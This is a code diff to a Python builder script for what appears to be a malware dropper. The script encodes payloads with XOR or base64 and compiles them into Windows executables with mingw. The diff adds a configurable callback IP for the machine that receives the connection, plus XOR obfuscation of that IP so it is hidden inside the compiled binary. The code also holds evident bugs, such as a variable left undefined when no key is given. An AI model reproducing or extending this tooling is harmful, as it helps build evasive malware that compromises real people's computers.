@@ -24,6 +24,8 @@ class Args:
 	header: str
 	encode_list: list[str]
 	dropper_write: str
+	ip: str
+	ip_xor_key: int
 	keep_log: bool
 	log_number: int
 	logging_output: str
@@ -57,6 +59,9 @@ def parse_args() -> Args:
 	parser.add_argument("--encode_list", nargs="*", type=str, default=[])
 	parser.add_argument("--dropper_write", type=str, default="")
 
+	parser.add_argument("--ip", type=str, default="")
+	parser.add_argument("--ip_xor_key", type=int, default=0)
+
 	parser.add_argument("--keep_log", action="store_true")
 	parser.add_argument("--log_number", type=int, default=0)
 	parser.add_argument("--logging_output", type=str, default="")
@@ -86,6 +91,8 @@ def parse_args() -> Args:
 		header=args.header,
 		encode_list=args.encode_list,
 		dropper_write=args.dropper_write,
+		ip=args.ip,
+        	ip_xor_key=args.ip_xor_key,
 		keep_log=args.keep_log,
 		log_number=args.log_number,
 		logging_output=args.logging_output,
@@ -96,9 +103,8 @@ def parse_args() -> Args:
 	)
 
 # converts the release/debug and x86/x64 into a PE executable with mingw.
-def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configuration_bool: bool, arch: int, xor_key: int, base64: bool, output_file: str, dict_ext: dict[str, bool], test_output: bool) -> int:
+def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configuration_bool: bool, arch: int, xor_key: int, base64: bool, output_file: str, dict_ext: dict[str, bool], ip:int, ip_xor:int, test_output: bool) -> int:
 
-	ip: str = "192.168.79.139"
 
 	if (base64 == True):
 		base64_integer = 1
@@ -122,6 +128,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 	print(f"This is your mingw_version: {mingw_version!s}")
 	print(f"This is your dropper write: {dropper_write!s}")
 	print(f"This is your ip: {ip!s}")
+
 	if (configuration_bool == True):
 		success = subprocess.run([
 		mingw_version,
@@ -139,6 +146,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 		f"-DDROPPER_XOR_KEY={xor_key!s}",
 		f"-DDROPPER_BASE64={base64_integer!s}",
 		f'-DIPADDR="{ip}"',
+		f"-DIPXOR={ip_xor}",
 		f"-DPOWERSHELL={dict_ext['powershell']}",
 		f"-DBATCH={dict_ext['batch']}",
 		f"-DPYTHON={dict_ext['python']}",
@@ -161,6 +169,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 		f"-DDROPPER_XOR_KEY={xor_key!s}",
 		f"-DDROPPER_BASE64={base64_integer!s}",
 	        f'-DIPADDR="{ip}"',
+		f"-DIPXOR={ip_xor}",
 		f"-DPOWERSHELL={dict_ext['powershell']}",
 		f"-DBATCH={dict_ext['batch']}",
 		f"-DPYTHON={dict_ext['python']}",
@@ -326,6 +335,10 @@ def xor_file(payload_file: str, xor_key: int, log_message: str, logging_output: 
 
 	return log_message
 
+def xor_ip(ip: str, xor_key: int) -> int:
+	ip_ret: int  = [ord(char) ^ xor_key for char in ip]
+	return ip_ret
+
 def revise_args(args: Args) -> None:
 
 	if (args.hardcode != True):
@@ -367,6 +380,12 @@ def revise_args(args: Args) -> None:
 		else:
 			if (args.test_output == True):
 				print("args.dropper_write gotten from dropper write flag.")
+
+		if (args.ip == ""):
+			args.ip = input("Set the ip address of the computer that will accept the connection: ")
+		else:
+			if (args.test_output == True):
+				print("args.ip gotten from dropper ip flag")
 
 		if (args.logging_output != ""):
 			args.logging_output = input("Give the file path to the place where logging will occur: ")
@@ -422,6 +441,13 @@ def revise_args(args: Args) -> None:
 				print(f"This is the args.dropper_write: {args.dropper_write}")
 		else:
 			args.dropper_write = r"\\\\exe_num28.exe"
+
+		if (args.ip != ""):
+			print("ip gotten from ip flag")
+			if (args.test_output == True):
+				print(f"This is the args.ip: {args.ip!s}")
+		else:
+			args.ip = "192.168.79.139"
 
 		if (args.logging_output != ""):
 			print("file_payload_preserve_path gotten from logging output.")
@@ -479,7 +505,7 @@ def check_extension(filename: str, extension_list: dict[str, bool]) -> dict[str,
 		case ".py":
 			extension_list["python"] = extension_value_set(extension_list["python"])
 		case _:
-			pass
+			pass # This needs to be worked on.
 
 	return extension_list
 
@@ -508,6 +534,9 @@ def main() -> int:
 	result: bool = False
 
 	file_ext_dict: dict[str, bool] = { "powershell": False, "batch": False, "python": False }
+
+	if (args.ip_xor_key != 0):
+		encrypted_ip: int = xor_ip(args.ip, args.ip_xor_key)
 
 	for i in range(len(args.encode_list)):
 
@@ -544,11 +573,14 @@ def main() -> int:
 
 		else: # do encode
 
+
 			encode = True
 			decode = False
 			if (args.default_xor == True or args.both_encoding == True or args.xor_key != 0):
+				print("xor ran")
 				log_list[i] = xor_file(args.encode_list[i], args.xor_key, log_list[i], args.logging_output, args.log_number, i,  args.test_output)
 			if (args.base64 == True or args.both_encoding == True):
+				print("base64 ran")
 				result, log_list[i] = base64_file(encode, decode, args.encode_list[i], log_list[i], args.logging_output, args.log_number, i, args.test_output)
 				if result == False:
 					for l in range(len(log_list)):
@@ -577,18 +609,18 @@ def main() -> int:
 
 		if args.release == True:
 			set_mingw_release = True
-			success = mingw_run(args.input, args.output, args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, file_ext_dict, args.test_output)
+			success = mingw_run(args.input, args.output,args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, file_ext_dict, encrypted_ip, args.ip_xor_key, args.test_output)
 			if (success == 0):
 				print("mingw ran successfully in release mode. Warnings are turned off.")
 		elif (args.debug == True):
 			set_mingw_release = False
-			success = mingw_run(args.input, args.output, args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, file_ext_dict, args.test_output)
+			success = mingw_run(args.input, args.output, args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, file_ext_dict, encrypted_ip, args.ip_xor_key, args.test_output)
 			if (success == 0):
 				print("mingw ran successfully in debug mode. Warnings are turned off. ")
 		else:
 			# will run in Release mode.
 			set_mingw_release = True
-			success = mingw_run(args.input, args.output, args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, file_ext_dict, args.test_output)
+			success = mingw_run(args.input, args.output, args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, file_ext_dict, encrypted_ip, args.ip_xor_key, args.test_output)
 			if (success == 0):
 				print("mingw ran successfully in release mode. Warnings are turned off. ")
 
